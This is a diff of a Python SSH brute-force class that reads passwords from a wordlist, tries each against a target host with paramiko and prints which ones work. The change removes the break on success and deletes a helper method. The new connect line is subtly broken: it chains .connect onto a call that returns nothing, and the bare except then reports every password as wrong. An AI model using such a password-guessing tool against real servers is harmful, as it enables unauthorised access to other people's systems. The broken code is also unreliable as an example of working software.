@@ -34,20 +34,11 @@ class BruteForce:
             line = linecache.getline(self.filename, i)
             line = line.strip()
             try:
-                self.get_ssh().connect(self.host, username=self.user, password=line,timeout=86400,banner_timeout=86400,auth_timeout=86400).close()
+                paramiko.SSHClient().set_missing_host_key_policy(paramiko.AutoAddPolicy()).connect(self.host, username=self.user, password=line).close()
                 q.put(line)   
                 print(f'[+] {line} is correct')
-                break
             except:
                 print(f'[-] {line} is not correct')
-            # finally:
-            #     if self.client:
-            #         self.client.close()
-            #     continue
-    def get_ssh(self):
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        return client
 
     def get_filelines(self,filename):
         lens = len(linecache.getlines(self.filename))
